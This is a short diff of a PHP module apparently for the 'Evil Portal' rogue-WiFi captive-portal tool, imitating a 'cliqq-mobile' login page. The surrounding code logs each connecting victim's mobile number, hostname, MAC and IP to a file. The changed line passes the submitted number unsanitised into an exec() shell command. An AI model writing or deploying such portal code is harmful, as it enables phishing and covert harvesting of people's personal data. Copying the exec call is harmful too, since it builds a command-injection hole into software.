@@ -45,7 +45,7 @@ class MyPortal extends Portal
             $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
             file_put_contents("$dir/evilportal-logs/cliqq-mobile.txt", "[" . date('Y-m-d H:i:s') . "Z]\n" . "mobileNumber: {$mobileNumber}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);
             
-            exec("pineapple notify $mobileNumber");
+            exec("notify $mobileNumber");
         }
         // handle form input or other extra things there
 
